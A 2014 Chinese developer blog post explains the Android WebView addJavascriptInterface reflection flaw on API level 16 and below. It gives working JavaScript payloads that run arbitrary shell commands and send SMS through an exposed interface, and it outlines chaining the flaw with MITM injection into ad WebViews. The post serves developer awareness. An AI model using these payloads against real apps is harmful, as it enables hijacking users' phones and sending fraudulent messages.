Title: 小心Android中的JavaScriptInterface 
Date: 2014-04-14 13:46:46
Tags: android, hack
Toc: no

去年的某一天，收到客户的反馈说我们的产品在他的手机上不工作。
看了一下日志发现是WebView中JavaScript调用的某个Java方法找不到，通过报错信息搜索后得知：

>Caution: If you've set your targetSdkVersion to 17 or higher, you must add the @JavascriptInterface annotation to any method that you want available your web page code (the method must also be public). If you do not provide the annotation, then the method will not accessible by your web page when running on Android 4.2 or higher.

### 问题
原来是API Level 17后，只会把带有@JavaScriptInterface的方法暴露给JavaScript，因为我的方法都没加这个Annotation，自然就无法调用了。

>Annotation that allows exposing methods to JavaScript. Starting from API level JELLY_BEAN_MR1 and above, only methods explicitly marked with this annotation are available to the Javascript code. See addJavascriptInterface(Object, String) for more information about it.

再看addJavaScriptInterface方法的文档：
>IMPORTANT:
This method can be used to allow JavaScript to control the host application. This is a powerful feature, but also presents a security risk for applications targeted to API level JELLY_BEAN or below, because JavaScript could use reflection to access an injected object's public fields. Use of this method in a WebView containing untrusted content could allow an attacker to manipulate the host application in unintended ways, executing Java code with the permissions of the host application. Use extreme care when using this method in a WebView which could contain untrusted content.

大概是说如果你访问了包括恶意内容的页面，攻击者会得到与应用相同的权限，通过反射来做一些你意想不到的事情。
反射？听起来很高级，到底有多危险？

### 原理
因为Java中所有的类都继承自java.lang.Object，而Object类中有一个方法是getClass()，拿到Class后就可以forName加载任意Class进行反射了。
能做什么呢？不妨来研究下。

### 应用

* 执行任意命令：

```JavaScript
function execute(cmd){
     return window.jsInterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"Hello Android!\” > /mnt/sdcard/test.txt']);
```

* 发送短信：

```
var smsManager = window.jsInterface.getClass().forName('android.telephony.SmsManager').getMethod('getDefault', null).invoke(null, null);
smsManager.sendTextMessage('133xxxxxxxx’, null, 'hello', null, null);
```

当然，攻击成功的前提是你的应用具有相应权限，比如上例中需要`WRITE_EXTERNAL_STORAGE`和`SEND_SMS`的权限。

### 扩展
这个漏洞要得到利用，你既要控制web内容，又需要应用本身具有相应权限，看起来没什么大不了的。真的是这样吗？   
很多免费应用都会集成广告平台SDK以在应用中显示广告条增加收入。这个广告条通常是用WebView实现的，而且拥有比较多的权限。如果恶意攻击者使用[dSploit](http://dsploit.net/)发起MITM攻击，篡改服务器返回的内容，插入恶意JavaScript代码，便可以轻易操纵你的手机。

往往这里一个小漏洞，那里一个小漏洞，两个小漏洞结合起来利用就能达到意想不到的效果。
作为开发者，我们要关注开发中的任何一个细节，尽量避免给用户带来威胁。   

---
文中代码：[Demo](https://github.com/hkliya/JavascriptInterfaceDemo)
参考资料：

* [WebView addJavascriptInterface Remote Code Execution](https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/)
* [addJavaScriptInterface.py](https://github.com/mwrlabs/drozer/blob/bcadf5c3fd08c4becf84ed34302a41d7b5e9db63/src/drozer/modules/exploit/mitm/addJavaScriptInterface.py)